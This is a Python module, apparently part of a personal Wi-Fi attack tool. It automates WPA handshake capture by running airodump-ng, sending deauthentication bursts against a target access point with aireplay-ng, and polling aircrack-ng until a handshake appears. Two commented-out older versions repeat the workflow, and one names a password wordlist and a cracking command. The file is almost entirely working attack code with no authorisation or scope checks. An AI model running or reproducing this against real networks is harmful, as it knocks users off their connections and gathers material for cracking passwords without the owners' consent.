#!/usr/bin/env python3
import subprocess
import os
from typing import Dict
from dataclasses import dataclass
import time
import sys
import signal
import atexit

@dataclass
class AircrackResult:
    success: bool
    output: str
    error: str = ""
    crack_time: float = 0.0


# Global process tracker for cleanup
active_processes = []

def cleanup_all_processes():
    """Kill all tracked processes on exit"""
    global active_processes
    for proc in active_processes:
        try:
            # Try to kill the process group
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except:
            try:
                proc.kill()
            except:
                pass
    active_processes = []
    # Reset terminal as final step
    os.system('reset >/dev/null 2>&1')

# Register cleanup on exit
atexit.register(cleanup_all_processes)

def signal_handler(sig, frame):
    """Handle interrupt signals"""
    print("\n[!] Caught signal, cleaning up...")
    cleanup_all_processes()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


class AircrackManager:
    def __init__(self):
        self.capture_dir = "/home/user01/Development/temp"
        self.interface = "wlan0mon"
        self.last_cap_file = None
        self.airodump_proc = None
        
        # Create capture directory if it doesn't exist
        os.makedirs(self.capture_dir, exist_ok=True)

    def capture_handshake(self, network: Dict, timeout: int = 120) -> bool:
        """Capture WPA handshake"""
        global active_processes
        
        bssid = network.get('ssid')
        mac = network.get('mac')
        channel = network.get('channel', '1')
        timestamp = int(time.time())
        cap_prefix = f"{self.capture_dir}/{bssid.replace(' ', '_')}_{timestamp}"
        
        print(f"\n[*] Capturing handshake for '{bssid}' (MAC: {mac})")
        print(f"[*] Channel: {channel}")
        print(f"[*] Capture file prefix: {cap_prefix}")
        
        # Build airodump command
        airodump_cmd = [
            "sudo", "airodump-ng",
            "-c", str(channel),
            "-w", cap_prefix,
            "--output-format", "pcap",
            "-a",  # Active scanning
            self.interface
        ]
        print (airodump_cmd)
        print("[*] Starting airodump-ng...")
        
        # Start airodump with output to files to prevent terminal takeover
        with open('/tmp/airodump.out', 'w') as out_file, open('/tmp/airodump.err', 'w') as err_file:
            try:
                self.airodump_proc = subprocess.Popen(
                    airodump_cmd,
                    stdout=out_file,
                    stderr=err_file,
                    stdin=subprocess.PIPE,
                    preexec_fn=os.setsid  # Create new session
                )
                
                # Add to global tracker
                active_processes.append(self.airodump_proc)
                
                # Verify it started
                time.sleep(2)
                if self.airodump_proc.poll() is None:
                    print(f"[+] airodump-ng started with PID: {self.airodump_proc.pid}")
                else:
                    print("[!] airodump-ng failed to start")
                    return False
                    
            except Exception as e:
                print(f"[!] Failed to start airodump-ng: {e}")
                return False
        
        # Wait for capture to stabilize
        print("[*] Waiting 5 seconds for capture to stabilize...")
        time.sleep(5)
        
        # Send deauth packets
        print(f"\n[*] Sending deauth packets to {mac}...")
        
        for burst in range(2):
            deauth_cmd = [
                "sudo", "aireplay-ng",
                "--deauth", "13",
                "-a", mac,
                self.interface,
                "-D"
            ]
            
            print(f"[*] Deauth burst {burst + 1}/2...")
            
            try:
                # Run deauth with output capture
                with open('/tmp/aireplay.out', 'w') as out_file, open('/tmp/aireplay.err', 'w') as err_file:
                    deauth_proc = subprocess.Popen(
                        deauth_cmd,
                        stdout=out_file,
                        stderr=err_file,
                        stdin=subprocess.PIPE
                    )
                    print(deauth_cmd)                    
                    # Wait for completion
                    deauth_proc.wait(timeout=15)
                    
                    if deauth_proc.returncode == 0:
                        print(f"[+] Deauth burst {burst + 1} completed")
                    else:
                        print(f"[!] Deauth burst {burst + 1} returned code: {deauth_proc.returncode}")
                        
            except subprocess.TimeoutExpired:
                print(f"[!] Deauth burst {burst + 1} timed out")
                deauth_proc.kill()
            except Exception as e:
                print(f"[!] Deauth error: {e}")
            
            if burst < 1:
                print(f"[*] Waiting 15 seconds before next burst...")
                time.sleep(15)
        
        print("\n[*] Deauth complete")
        print(f"[*] Monitoring for handshake (up to {timeout} seconds)...")
        
        # Monitor for handshake
        start_time = time.time()
        handshake_detected = False
        last_check = 0
        
        while time.time() - start_time < timeout:
            elapsed = int(time.time() - start_time)
            
            # Progress update
            if elapsed - last_check >= 10:
                print(f"[*] Progress: {elapsed}/{timeout} seconds")
                last_check = elapsed
            
            # Check for handshake every 15 seconds
            if elapsed % 15 == 0 and elapsed > 0:
                # Look for capture files
                cap_files = []
                try:
                    for f in os.listdir(self.capture_dir):
                        if f.startswith(os.path.basename(cap_prefix)) and f.endswith('.cap'):
                            cap_files.append(f)
                            
                    if cap_files:
                        cap_file = os.path.join(self.capture_dir, cap_files[0])
                        file_size = os.path.getsize(cap_file)
                        print(f"[*] Found capture file: {os.path.basename(cap_file)} ({file_size} bytes)")
                        
                        # Check with aircrack-ng
                        print("[*] Checking for handshake...")
                        check_result = subprocess.run(
                            ["aircrack-ng", cap_file],
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            text=True,
                            timeout=10
                        )
                        
                        # Look for handshake in output
                        if 'handshake' in check_result.stdout.lower():
                            print("[+] Handshake detected!")
                            handshake_detected = True
                            self.last_cap_file = cap_file
                            print("[*] Capturing for 10 more seconds...")
                            time.sleep(10)
                            break
                        else:
                            print("[*] No handshake yet, continuing...")
                            
                except Exception as e:
                    print(f"[!] Error checking for handshake: {e}")
            
            time.sleep(5)
        
        # Stop airodump-ng
        print("\n[*] Stopping airodump-ng...")
        if self.airodump_proc and self.airodump_proc.poll() is None:
            try:
                # Kill the process group
                pgid = os.getpgid(self.airodump_proc.pid)
                os.killpg(pgid, signal.SIGTERM)
                time.sleep(1)
                if self.airodump_proc.poll() is None:
                    os.killpg(pgid, signal.SIGKILL)
            except:
                try:
                    self.airodump_proc.kill()
                except:
                    pass
            
            # Remove from tracker
            if self.airodump_proc in active_processes:
                active_processes.remove(self.airodump_proc)
                
        print("[*] Capture stopped")
        
        # Reset terminal just in case
        os.system('reset >/dev/null 2>&1')
        
        # Final check
        if not handshake_detected:
            print("\n[*] Doing final check for capture files...")
            try:
                cap_files = [f for f in os.listdir(self.capture_dir) 
                            if f.startswith(os.path.basename(cap_prefix)) and f.endswith('.cap')]
                
                if cap_files:
                    cap_file = os.path.join(self.capture_dir, cap_files[0])
                    self.last_cap_file = cap_file
                    
                    # Final verification
                    check_result = subprocess.run(
                        ["aircrack-ng", cap_file],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        timeout=10
                    )
                    
                    if 'handshake' in check_result.stdout.lower():
                        print("[+] Handshake found in final check!")
                        handshake_detected = True
            except Exception as e:
                print(f"[!] Error in final check: {e}")
        
        if self.last_cap_file:
            print(f"\n[*] Capture file: {self.last_cap_file}")
            file_size = os.path.getsize(self.last_cap_file)
            print(f"[*] File size: {file_size} bytes")
            
            if handshake_detected:
                print("[+] Handshake captured successfully!")
                return True
            else:
                print("[!] No handshake detected, but file saved for analysis")
                return False
        else:
            print("[!] No capture file created!")
            return False

    def crack_with_aircrack(self, network: Dict) -> AircrackResult:
        """STUB: Placeholder for future cracking functionality"""
        if not self.last_cap_file:
            return AircrackResult(
                success=False,
                output="",
                error="No capture file available"
            )
        
        print(f"\n[*] Ready to crack!")
        print(f"[*] Capture file: {self.last_cap_file}")
        print(f"[*] Network: {network['ssid']} (MAC: {network['mac']})")
        
        return AircrackResult(
            success=True,
            output=f"Handshake captured: {self.last_cap_file}",
            error=""
        )
    
    def cleanup(self):
        """Clean up"""
        global active_processes
        
        print("\n[*] Cleaning up...")
        
        # Kill any remaining processes
        if self.airodump_proc and self.airodump_proc.poll() is None:
            try:
                self.airodump_proc.kill()
            except:
                pass
        
        cleanup_all_processes()
        
        if self.last_cap_file:
            print(f"[*] Last capture: {self.last_cap_file}")
        
        # Final terminal reset
        os.system('reset >/dev/null 2>&1')


if __name__ == "__main__":
    print("=== Aircrack Module ===")
    print("Monitor with: watch 'ps aux | grep -E \"airodump|aireplay\"'")
    print("Press Ctrl+C for clean shutdown\n")
    
    try:
        manager = AircrackManager()
        # Example usage:
        # network = {'ssid': 'TestNet', 'mac': 'AA:BB:CC:DD:EE:FF', 'channel': '6'}
        # manager.capture_handshake(network)
        manager.cleanup()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        cleanup_all_processes()
































# # aircrack_module.py
# import subprocess
# import os
# from typing import Dict
# from dataclasses import dataclass
# import time
# import re
# import sys
# @dataclass
# class AircrackResult:
#     success: bool
#     output: str
#     error: str = ""
#     crack_time: float = 0.0

# def status(msg: str, end: str = "\n"):
#     # \r = carriage return to column 0
#     # \033[K = clear from cursor to end of line
#     sys.stdout.write("\r\033[K" + msg + end)
#     sys.stdout.flush()


# class AircrackManager:
#     def __init__(self):
#         self.aircrack_path = "/usr/bin/aircrack-ng"
#         self.wordlist_path = "/usr/share/wordlists/rockyou.txt"  # Common wordlist location
#         self.capture_dir = "/home/user01/Development/temp"
#         self.interface = "wlan0mon"
#         self.last_cap_file = None

#     def check_prerequisites(self) -> bool:
#         """Check if aircrack-ng is installed and interface is ready"""
#         status("[*] Checking prerequisites...")
        
#         # Check aircrack-ng
#         if not os.path.exists(self.aircrack_path):
#             status(f"[!] aircrack-ng not found at {self.aircrack_path}")
#             return False
        
#         # Check capture directory
#         os.makedirs(self.capture_dir, exist_ok=True)
        
#         # Check if interface exists
#         result = subprocess.run(["iwconfig"], capture_output=True, text=True)
#         # status(result)
        
#         # Check both stdout and stderr since iwconfig uses stderr
#         output = result.stdout + result.stderr
        
#         if self.interface not in output:
#             status(f"[!] Interface {self.interface} not found")
#             return False
        
#         status("[+] Prerequisites OK")
#         return True

    




#     def capture_handshake(self, network: Dict, timeout: int = 120) -> bool:
#         """Capture WPA handshake optimized for hcxpcapngtool conversion"""
#         bssid = network.get('ssid')
#         mac = network.get('mac')
#         channel = network.get('channel', '1')
#         timestamp = int(time.time())
#         cap_prefix = f"{self.capture_dir}/{bssid.replace(' ', '_')}_{timestamp}"
        
#         status(f"\n[*] Capturing handshake for '{bssid}' (MAC: {mac})")
#         status(f"[*] Channel: {channel}")
#         status(f"[*] Capture file prefix: {cap_prefix}")
        
#         status("[*] Starting airodump-ng capture...")
        
#         # Use airodump-ng - it captures with radiotap headers by default in monitor mode
#         # Don't filter by BSSID initially to capture probe requests
#         airodump_proc = subprocess.Popen(
#             [
#                 "sudo", "airodump-ng",
#                 "-c", channel,
#                 "-w", cap_prefix,
#                 "--output-format", "pcap",  # Use pcap format (airodump adds radiotap)
#                 self.interface,
#                 "-D"
#             ],
#             stdout=subprocess.DEVNULL,
#             stderr=subprocess.DEVNULL,
#             stdin=subprocess.DEVNULL
#         )
        
#         status("[*] Waiting 5 seconds for capture to stabilize...")
#         time.sleep(5)
        
#         # Send gentle deauth bursts to avoid overwhelming the AP
#         status("[*] Sending gentle deauth bursts to {}...".format(mac))
        
#         # 2 bursts of 3 packets with 15 second delays
#         for burst in range(2):
#             subprocess.run(
#                 [
#                     "sudo", "aireplay-ng",
#                     "--deauth", "13",  # Only 3 packets per burst
#                     "-a", mac,
#                     self.interface,
#                     "-D"
#                 ],
#                 stdout=subprocess.DEVNULL,
#                 stderr=subprocess.DEVNULL,
#                 stdin=subprocess.DEVNULL,
#                 timeout=15
#             )
#             if burst < 1:
#                 status(f"[*] Burst {burst + 1}/2 complete, waiting 15 seconds...")
#                 time.sleep(15)
        
#         status("[*] Deauth complete")
#         status("[*] Continuing capture for up to {} seconds...".format(timeout))
        
#         # Monitor for handshake
#         start_time = time.time()
#         handshake_detected = False
        
#         while time.time() - start_time < timeout:
#             elapsed = int(time.time() - start_time)
            
#             # Check periodically with aircrack-ng
#             if elapsed % 15 == 0 and elapsed > 0:
#                 # Find the cap file (airodump adds -01, -02, etc.)
#                 cap_files = [f for f in os.listdir(self.capture_dir) 
#                             if f.startswith(os.path.basename(cap_prefix)) and f.endswith('.cap')]
                
#                 if cap_files:
#                     cap_file = os.path.join(self.capture_dir, cap_files[0])
                    
#                     try:
#                         check = subprocess.run(
#                             ["aircrack-ng", cap_file],
#                             capture_output=True,
#                             text=True,
#                             timeout=10
#                         )
                        
#                         if '1 handshake' in check.stdout.lower():
#                             status("\n[+] Handshake detected!")
#                             handshake_detected = True
#                             self.last_cap_file = cap_file
#                             # Continue for 10 more seconds to ensure complete capture
#                             time.sleep(10)
#                             break
#                     except:
#                         pass
            
#             status(f"[*] Monitoring... {elapsed}/{timeout}s", end='\r')
#             time.sleep(5)
        
#         status("")  # New line after monitoring
        
#         if not handshake_detected:
#             status("[*] No handshake detected during monitoring")
        
#         # Stop capture
#         status("[*] Stopping capture...")
#         airodump_proc.terminate()
#         try:
#             airodump_proc.wait(timeout=5)
#         except subprocess.TimeoutExpired:
#             airodump_proc.kill()
#             try:
#                 airodump_proc.wait(timeout=2)
#             except:
#                 pass
        
#         status("[*] Capture stopped")
        
#         # Find the capture file
#         cap_files = [f for f in os.listdir(self.capture_dir) 
#                     if f.startswith(os.path.basename(cap_prefix)) and f.endswith('.cap')]
        
#         if cap_files:
#             cap_file = os.path.join(self.capture_dir, cap_files[0])
#             self.last_cap_file = cap_file
            
#             status(f"[*] Capture saved: {cap_file}")
#             status(f"[*] Format: PCAP with radiotap headers (from airodump-ng)")
#             status(f"[*] Captured on channel {channel} (includes all traffic)")
            
#             # Final verification
#             try:
#                 check = subprocess.run(
#                     ["aircrack-ng", cap_file],
#                     capture_output=True,
#                     text=True,
#                     timeout=10
#                 )
                
#                 if '1 handshake' in check.stdout.lower():
#                     status("[+] Handshake verified!")
#                     status("[*] Ready for hcxpcapngtool conversion")
#                     return True
#                 else:
#                     status("[!] No handshake found in final check")
#                     status("[*] File saved for manual analysis")
#                     return False
#             except Exception as e:
#                 status(f"[!] Error during verification: {e}")
#                 return False
#         else:
#             status("[!] No capture file created!")
#             return False


#     def crack_with_aircrack(self, network: Dict) -> AircrackResult:
#         """STUB: Placeholder for future cracking functionality"""
#         if not self.last_cap_file:
#             return AircrackResult(
#                 success=False,
#                 output="",
#                 error="No capture file available"
#             )
        
#         status(f"\n[*] Handshake captured successfully!")
#         status(f"[*] Capture file: {self.last_cap_file}")
#         status(f"[*] Network: {network['ssid']} (MAC: {network['mac']})")
#         status(f"\n[STUB] Cracking not implemented yet")
#         status(f"[STUB] To crack manually, run:")
#         status(f"[STUB]   aircrack-ng -w /path/to/wordlist.txt -b {network['mac']} {self.last_cap_file}")
        
#         return AircrackResult(
#             success=True,
#             output=f"Handshake captured: {self.last_cap_file}",
#             error=""
#         )
    
#     def cleanup(self):
#         """Clean up capture files"""
#         status("\n[*] Cleanup options:")
#         status(f"[*] Capture files are in: {self.capture_dir}")
#         if self.last_cap_file:
#             status(f"[*] Last capture: {self.last_cap_file}")
#         status(f"[STUB] Auto-cleanup not implemented - files preserved for analysis")




















#     # def capture_handshake(self, network: Dict, timeout: int = 120) -> bool:
#     #     """Capture WPA handshake using airodump-ng + aireplay-ng"""
#     #     bssid = network.get('ssid')
#     #     mac = network.get('mac')
#     #     channel = network.get('channel', '1')
#     #     timestamp = int(time.time())
#     #     cap_prefix = f"{self.capture_dir}/{bssid.replace(' ', '_')}_{timestamp}"
        
#     #     status(f"\n[*] Capturing handshake for '{bssid}' (MAC: {mac})")
#     #     status(f"[*] Channel: {channel}")
#     #     status(f"[*] Capture file prefix: {cap_prefix}")
        
#     #     # Start airodump-ng in background
#     #     log_file = f"{cap_prefix}_airodump.log"
#     #     airodump_proc = subprocess.Popen(
#     #         [
#     #             "sudo", "airodump-ng",
#     #             "--bssid", mac,
#     #             "-c", channel,
#     #             "-w", cap_prefix,
#     #             "-D",
#     #             self.interface
#     #         ],
#     #         stdout=subprocess.DEVNULL,
#     #         stderr=subprocess.DEVNULL,
#     #         stdin=subprocess.DEVNULL
#     #     )
        
#     #     status("[*] Airodump-ng started, waiting 5 seconds before deauth...")
#     #     time.sleep(5)
        
#     #     # Send deauth packets - completely suppress output
#     #     status("[*] Sending 30 deauth packets to {}...".format(mac))
        
#     #     deauth_log = f"{cap_prefix}_deauth.log"
#     #     result = subprocess.run(
#     #         [
#     #             "sudo", "aireplay-ng",
#     #             "--deauth", "30",
#     #             "-a", mac,
#     #             "-D",
#     #             self.interface
#     #         ],
#     #         stdout=subprocess.DEVNULL,
#     #         stderr=subprocess.DEVNULL,
#     #         stdin=subprocess.DEVNULL
#     #     )
        
#     #     status("[*] Deauth complete")
#     #     status("[*] Continuing capture for up to {} seconds...".format(timeout))
        
#     #     # Monitor for handshake
#     #     start_time = time.time()
#     #     handshake_detected = False
        
#     #     while time.time() - start_time < timeout:
#     #         # Check airodump output file for handshake indicators
#     #         cap_files = [f for f in os.listdir(self.capture_dir) 
#     #                     if f.startswith(os.path.basename(cap_prefix)) and f.endswith('.cap')]
            
#     #         if cap_files:
#     #             cap_file = os.path.join(self.capture_dir, cap_files[0])
#     #             # Quick check with aircrack
#     #             try:
#     #                 check = subprocess.run(
#     #                     ["aircrack-ng", cap_file],
#     #                     capture_output=True,
#     #                     text=True,
#     #                     timeout=5
#     #                 )
#     #                 if '1 handshake' in check.stdout.lower():
#     #                     status("[+] Handshake detected!")
#     #                     handshake_detected = True
#     #                     self.last_cap_file = cap_file
#     #                     time.sleep(5)  # Give it a bit more time
#     #                     break
#     #             except:
#     #                 pass
            
#     #         time.sleep(5)
        
#     #     if not handshake_detected:
#     #         status("[*] No handshake detected in {} seconds".format(timeout))
        
#     #     # Stop airodump
#     #     airodump_proc.terminate()
#     #     try:
#     #         airodump_proc.wait(timeout=5)
#     #     except subprocess.TimeoutExpired:
#     #         airodump_proc.kill()
#     #         try:
#     #             airodump_proc.wait(timeout=2)
#     #         except:
#     #             pass
        
#     #     status("[*] Capture stopped")
        
#     #     # Final check
#     #     if not handshake_detected:
#     #         cap_files = [f for f in os.listdir(self.capture_dir) 
#     #                     if f.startswith(os.path.basename(cap_prefix)) and f.endswith('.cap')]
            
#     #         if cap_files:
#     #             cap_file = os.path.join(self.capture_dir, cap_files[0])
#     #             self.last_cap_file = cap_file
                
#     #             status("[*] Checking capture file: {}".format(cap_file))
                
#     #             try:
#     #                 check = subprocess.run(
#     #                     ["aircrack-ng", cap_file],
#     #                     capture_output=True,
#     #                     text=True,
#     #                     timeout=10
#     #                 )
                    
#     #                 if '1 handshake' in check.stdout.lower():
#     #                     status("[+] Handshake found in final check!")
#     #                     status("[*] Capture file saved: {}".format(cap_file))
#     #                     return True
#     #                 else:
#     #                     status("[!] No handshake found")
#     #                     return False
#     #             except Exception as e:
#     #                 status("[!] Error checking capture: {}".format(e))
#     #                 return False
#     #         else:
#     #             status("[!] No capture file found!")
#     #             return False
#     #     else:
#     #         status("[*] Capture file saved: {}".format(self.last_cap_file))
#     #         return True
